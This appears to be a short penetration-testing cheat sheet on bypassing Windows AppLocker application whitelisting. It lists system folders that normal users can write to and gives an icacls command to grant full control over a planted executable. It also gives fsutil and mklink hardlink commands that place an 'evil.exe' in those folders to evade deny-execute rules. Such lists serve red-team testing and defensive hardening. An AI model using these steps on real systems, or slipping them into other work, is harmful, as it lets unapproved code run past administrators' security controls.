This list contains generic methods of bypassing AppLocker.

## Placing files in writeable paths

The following folders are by default writable by normal users (depends on Windows version - This is from W10 1803)
```
C:\Windows\Tasks 

C:\Windows\Temp 

C:\windows\tracing

C:\Windows\Registration\CRMLog

C:\Windows\System32\FxsTmp

C:\Windows\System32\com\dmp

C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys

C:\Windows\System32\spool\PRINTERS

C:\Windows\System32\spool\SERVERS

C:\Windows\System32\spool\drivers\color

C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter

C:\Windows\System32\Tasks_Migrated (after peforming a version upgrade of Windows 10)

C:\Windows\SysWOW64\FxsTmp

C:\Windows\SysWOW64\com\dmp

C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter

C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
```

If you can place a file or folder into the path you become the owner of that object and you can change the ACL either in GUI or using ICACLS. That includes adding Execute rights and more. We can use ICACLS via `icacls "FULL PATH TO EXE" /grant "USERNAME":F` here F signifies full control
If deny execute is inherit you can either disable inheritance or you can use hardlink to a binary file in another folder using one of these commands:
```
fsutil hardlink create c:\windows\system32\fxstmp\evil.exe c:\myfolder\plantedfile.exe 

mklink /h c:\windows\system32\fxstmp\evil.exe c:\myfolder\plantedfile.exe 
```
here "c:\windows\system32\fxstmp\evil.exe" is the new exe from any path in the above list
